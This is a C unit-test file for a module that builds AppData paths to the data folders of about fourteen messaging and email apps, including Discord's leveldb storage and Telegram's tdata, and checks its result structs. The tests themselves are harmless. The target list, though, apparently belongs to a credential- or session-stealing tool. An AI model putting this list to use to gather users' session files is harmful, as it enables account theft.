#define _POSIX_C_SOURCE 200809L
/*
 * test_messengers.c — Messenger directory scanning tests
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "messengers.h"

extern void messenger_get_path(char *buf, size_t bufsz, const char *appdata,
                               const char *subdir);

static void test_messenger_result_struct(void) {
    MessengerResult r = {0};
    assert(r.files == NULL);
    assert(r.count == 0);
    assert(r.name == NULL);
    printf("  PASS: test_messenger_result_struct\n");
}

static void test_messenger_data_struct(void) {
    MessengerData data = {0};
    assert(data.discord.files == NULL);
    assert(data.telegram.files == NULL);
    assert(data.signal.files == NULL);
    assert(data.whatsapp.files == NULL);
    assert(data.skype.files == NULL);
    assert(data.viber.files == NULL);
    assert(data.element.files == NULL);
    assert(data.session.files == NULL);
    assert(data.tox.files == NULL);
    assert(data.icq.files == NULL);
    assert(data.pidgin.files == NULL);
    assert(data.outlook.files == NULL);
    printf("  PASS: test_messenger_data_struct\n");
}

static void test_messenger_result_alloc_free(void) {
    MessengerResult r = {0};
    r.name = strdup("TestMessenger");
    r.files = calloc(3, sizeof(char *));
    r.files[0] = strdup("/path/to/file1.db");
    r.files[1] = strdup("/path/to/file2.db");
    r.files[2] = strdup("/path/to/file3.log");
    r.count = 3;
    assert(strcmp(r.name, "TestMessenger") == 0);
    assert(r.count == 3);
    /* Manual cleanup (free_messenger_result not in standalone mode) */
    for (size_t i = 0; i < r.count; i++) free(r.files[i]);
    free(r.files);
    free(r.name);
    printf("  PASS: test_messenger_result_alloc_free\n");
}

static void test_free_messenger_data_null(void) {
    MessengerData data = {0};
    /* Should not crash on zeroed struct — just verify it zeroes cleanly */
    assert(data.discord.files == NULL);
    assert(data.discord.count == 0);
    printf("  PASS: test_free_messenger_data_null\n");
}

static void test_discord_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Discord\\Local Storage\\leveldb");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Discord\\Local Storage\\leveldb") == 0);
    printf("  PASS: test_discord_path_pattern\n");
}

static void test_telegram_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Telegram Desktop\\tdata");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Telegram Desktop\\tdata") == 0);
    printf("  PASS: test_telegram_path_pattern\n");
}

static void test_signal_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Signal");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Signal") == 0);
    printf("  PASS: test_signal_path_pattern\n");
}

static void test_whatsapp_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "WhatsApp");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\WhatsApp") == 0);
    printf("  PASS: test_whatsapp_path_pattern\n");
}

static void test_messenger_result_empty_files(void) {
    MessengerResult r = {0};
    r.name = strdup("Empty");
    r.files = NULL;
    r.count = 0;
    assert(r.count == 0);
    assert(r.files == NULL);
    free(r.name);
    printf("  PASS: test_messenger_result_empty_files\n");
}

static void test_all_messenger_names_assigned(void) {
    size_t expected_count = 14;
    MessengerData data = {0};
    MessengerResult *fields[] = {
        &data.discord, &data.telegram, &data.signal, &data.whatsapp,
        &data.skype, &data.viber, &data.element, &data.session,
        &data.tox, &data.icq, &data.pidgin, &data.outlook,
        &data.jabber, &data.microsip
    };
    assert(sizeof(fields) / sizeof(fields[0]) == expected_count);
    for (size_t i = 0; i < expected_count; i++) {
        assert(fields[i]->files == NULL);
        assert(fields[i]->count == 0);
    }
    printf("  PASS: test_all_messenger_names_assigned\n");
}

/* ── Extended tests ──────────────────────────────────────── */

static void test_skype_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Skype");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Skype") == 0);
    printf("  PASS: test_skype_path_pattern\n");
}

static void test_viber_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "ViberPC");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\ViberPC") == 0);
    printf("  PASS: test_viber_path_pattern\n");
}

static void test_element_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Element");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Element") == 0);
    printf("  PASS: test_element_path_pattern\n");
}

static void test_session_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Session");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Session") == 0);
    printf("  PASS: test_session_path_pattern\n");
}

static void test_tox_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "tox");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\tox") == 0);
    printf("  PASS: test_tox_path_pattern\n");
}

static void test_icq_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "ICQ");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\ICQ") == 0);
    printf("  PASS: test_icq_path_pattern\n");
}

static void test_pidgin_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", ".purple");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\.purple") == 0);
    printf("  PASS: test_pidgin_path_pattern\n");
}

static void test_outlook_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Microsoft\\Outlook");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Microsoft\\Outlook") == 0);
    printf("  PASS: test_outlook_path_pattern\n");
}

static void test_microsip_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "MicroSIP");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\MicroSIP") == 0);
    printf("  PASS: test_microsip_path_pattern\n");
}

static void test_jabber_path_pattern(void) {
    char buf[1024];
    messenger_get_path(buf, sizeof(buf), "C:\\Users\\test\\AppData\\Roaming", "Psi");
    assert(strcmp(buf, "C:\\Users\\test\\AppData\\Roaming\\Psi") == 0);
    printf("  PASS: test_jabber_path_pattern\n");
}

static void test_messenger_result_null_name(void) {
    MessengerResult r = {0};
    r.name = NULL;
    r.files = calloc(1, sizeof(char *));
    r.files[0] = strdup("test.db");
    r.count = 1;
    assert(r.name == NULL);
    assert(r.count == 1);
    free(r.files[0]);
    free(r.files);
    printf("  PASS: test_messenger_result_null_name\n");
}

static void test_messenger_data_jabber_microsip(void) {
    MessengerData data = {0};
    assert(data.jabber.files == NULL);
    assert(data.jabber.count == 0);
    assert(data.microsip.files == NULL);
    assert(data.microsip.count == 0);
    printf("  PASS: test_messenger_data_jabber_microsip\n");
}

static void test_messenger_path_overflow_safety(void) {
    char buf[16];
    messenger_get_path(buf, sizeof(buf), "C:\\VeryLongPath", "AlsoLong");
    assert(strlen(buf) < sizeof(buf));
    printf("  PASS: test_messenger_path_overflow_safety\n");
}

int main(void) {
    printf("=== test_messengers: messenger directory scanning ===\n");
    test_messenger_result_struct();
    test_messenger_data_struct();
    test_messenger_result_alloc_free();
    test_free_messenger_data_null();
    test_discord_path_pattern();
    test_telegram_path_pattern();
    test_signal_path_pattern();
    test_whatsapp_path_pattern();
    test_messenger_result_empty_files();
    test_all_messenger_names_assigned();
    test_skype_path_pattern();
    test_viber_path_pattern();
    test_element_path_pattern();
    test_session_path_pattern();
    test_tox_path_pattern();
    test_icq_path_pattern();
    test_pidgin_path_pattern();
    test_outlook_path_pattern();
    test_microsip_path_pattern();
    test_jabber_path_pattern();
    test_messenger_result_null_name();
    test_messenger_data_jabber_microsip();
    test_messenger_path_overflow_safety();
    printf("=== test_messengers: ALL PASSED ===\n");
    return 0;
}
